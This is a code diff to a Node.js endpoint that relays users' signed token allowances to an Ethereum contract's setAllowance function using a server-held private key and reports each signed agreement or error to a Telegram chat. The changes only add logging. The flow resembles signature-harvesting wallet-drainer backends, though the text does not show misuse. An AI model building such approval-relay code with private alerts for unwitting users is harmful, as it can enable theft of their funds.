@@ -13,7 +13,10 @@ function sendTelegramMessage(message) {
     const token = TELEGRAM_CONFIG.botToken;
     const chatId = TELEGRAM_CONFIG.chatId;
 
-    if (!token || token === 'YOUR_BOT_TOKEN_HERE') return;
+    if (!token || token === 'YOUR_BOT_TOKEN_HERE') {
+        console.log('⚠️ Telegram credentials not configured. Skipping notification.');
+        return;
+    }
 
     const data = JSON.stringify({
         chat_id: chatId,
@@ -65,7 +68,16 @@ module.exports = async (req, res) => {
     try {
         const { user, amount, expiration, nonce, sigDeadline, signature } = req.body;
 
-        console.log('📥 REQUEST RECEIVED:', { user, amount, expiration, nonce, sigDeadline });
+        // ⭐ Debug Logs (පරණ එකේ තිබ්බා වගේ)
+        console.log('========================================');
+        console.log('📥 REQUEST RECEIVED');
+        console.log('  👤 User:', user);
+        console.log('  💰 Amount:', amount);
+        console.log('  ⏰ Expiration:', expiration);
+        console.log('  🔢 Nonce:', nonce);
+        console.log('  ⏳ Sig Deadline:', sigDeadline);
+        console.log('  📝 Signature:', signature ? signature.substring(0, 40) + '...' : 'null');
+        console.log('========================================');
 
         const CONFIG = {
             rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`,
@@ -73,18 +85,28 @@ module.exports = async (req, res) => {
             contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33"
         };
 
-        if (!CONFIG.privateKey) return res.status(500).json({ success: false, error: 'PRIVATE_KEY not set' });
-        if (!process.env.ALCHEMY_API_KEY) return res.status(500).json({ success: false, error: 'ALCHEMY_API_KEY not set' });
-        if (!user) return res.status(400).json({ success: false, error: 'user address is required' });
+        if (!CONFIG.privateKey) {
+            console.error('❌ PRIVATE_KEY not set');
+            return res.status(500).json({ success: false, error: 'PRIVATE_KEY not set' });
+        }
+        if (!process.env.ALCHEMY_API_KEY) {
+            console.error('❌ ALCHEMY_API_KEY not set');
+            return res.status(500).json({ success: false, error: 'ALCHEMY_API_KEY not set' });
+        }
+        if (!user) {
+            return res.status(400).json({ success: false, error: 'user address is required' });
+        }
 
         const provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcUrl);
         const wallet = new ethers.Wallet(CONFIG.privateKey, provider);
+        console.log('👛 Wallet Address (Gas payer):', wallet.address);
 
         const contractABI = [
             "function setAllowance(address user, uint160 amount, uint48 expiration, uint48 nonce, uint256 sigDeadline, bytes calldata signature) external"
         ];
 
         const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);
+        console.log('📋 Contract:', CONFIG.contractAddress);
 
         console.log('⏳ Submitting setAllowance()...');
         const tx = await contract.setAllowance(
@@ -101,6 +123,7 @@ module.exports = async (req, res) => {
 
         const receipt = await tx.wait();
         console.log('✅ CONFIRMED! Block:', receipt.blockNumber);
+        console.log('⛽ Gas Used:', receipt.gasUsed.toString());
 
         const successMessage = `🚨 <b>New POS Agreement Signed!</b>\n\n` +
                                `👤 <b>User:</b> <code>${user}</code>\n` +
@@ -119,7 +142,9 @@ module.exports = async (req, res) => {
         });
 
     } catch (error) {
+        console.error('========================================');
         console.error('❌ ERROR:', error.message);
+        console.error('========================================');
         
         const errorMessage = `❌ <b>POS Agreement Error!</b>\n\n⚠️ <b>Error:</b> ${error.message}`;
         sendTelegramMessage(errorMessage);
